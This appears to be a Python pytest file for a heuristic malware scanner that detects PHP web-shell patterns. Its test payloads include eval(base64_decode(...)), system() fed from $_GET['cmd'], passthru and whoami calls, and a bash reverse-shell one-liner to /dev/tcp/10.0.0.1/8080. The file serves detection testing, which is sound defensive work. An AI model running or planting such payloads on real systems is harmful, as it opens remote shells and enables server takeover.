"""Tests for lib.scanner.heuristic -- HeuristicScanner."""

from __future__ import annotations

import pytest

from lib.scanner.heuristic import HeuristicScanner


@pytest.fixture
def scanner() -> HeuristicScanner:
    return HeuristicScanner(enabled=True)


# PHP code snippets for testing (these are test payloads, not real code)
_EVAL_BASE64 = b"<?php eval(base64_decode('ZWNobyAiaGVsbG8iOw==')); ?>"
_SYSTEM_CALL = b"<?php system('ls -la'); ?>"
_MULTI_PATTERN = (
    b"<?php\n"
    b"eval(base64_decode('test'));\n"
    b"system('whoami');\n"
    b"passthru('id');\n"
    b"?>"
)
_REVERSE_SHELL = b"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"


class TestHeuristicDetection:
    async def test_eval_base64_detected(self, scanner: HeuristicScanner) -> None:
        findings = await scanner.scan("/test.php", _EVAL_BASE64)
        rules = [f.rule for f in findings]
        assert "eval_base64" in rules
        match = next(f for f in findings if f.rule == "eval_base64")
        assert match.score == 40

    async def test_system_with_user_input_detected(self, scanner: HeuristicScanner) -> None:
        content = b'<?php system($_GET["cmd"]); ?>'
        findings = await scanner.scan("/test.php", content)
        rules = [f.rule for f in findings]
        assert "system_user_input" in rules

    async def test_clean_php_no_findings(self, scanner: HeuristicScanner, sample_clean_php: bytes) -> None:
        findings = await scanner.scan("/clean.php", sample_clean_php)
        assert findings == []

    async def test_binary_content_skipped(self, scanner: HeuristicScanner) -> None:
        content = b"\x00\x01\x02\x03" + b"some payload here"
        findings = await scanner.scan("/binary.bin", content)
        assert findings == []

    async def test_empty_content_skipped(self, scanner: HeuristicScanner) -> None:
        findings = await scanner.scan("/empty.php", b"")
        assert findings == []

    async def test_multiple_patterns_in_one_file(self, scanner: HeuristicScanner) -> None:
        findings = await scanner.scan("/multi.php", _MULTI_PATTERN)
        rules = [f.rule for f in findings]
        assert "eval_base64" in rules
        assert len(findings) >= 1  # at least eval_base64

    async def test_webshell_content(self, scanner: HeuristicScanner, sample_php_webshell: bytes) -> None:
        findings = await scanner.scan("/shell.php", sample_php_webshell)
        assert len(findings) > 0
        rules = [f.rule for f in findings]
        assert "eval_base64" in rules

    async def test_reverse_shell_detected(self, scanner: HeuristicScanner) -> None:
        findings = await scanner.scan("/rev.sh", _REVERSE_SHELL)
        rules = [f.rule for f in findings]
        assert "reverse_shell" in rules
        match = next(f for f in findings if f.rule == "reverse_shell")
        assert match.score == 50

    async def test_findings_have_metadata(self, scanner: HeuristicScanner) -> None:
        content = b"<?php eval(base64_decode('test')); ?>"
        findings = await scanner.scan("/test.php", content)
        for f in findings:
            assert "offset" in f.metadata
            assert "match" in f.metadata
            assert f.scanner == "heuristic"


class TestHeuristicDisabled:
    async def test_disabled_scanner_property(self) -> None:
        scanner = HeuristicScanner(enabled=False)
        assert scanner.enabled is False

    async def test_enabled_scanner_property(self) -> None:
        scanner = HeuristicScanner(enabled=True)
        assert scanner.enabled is True
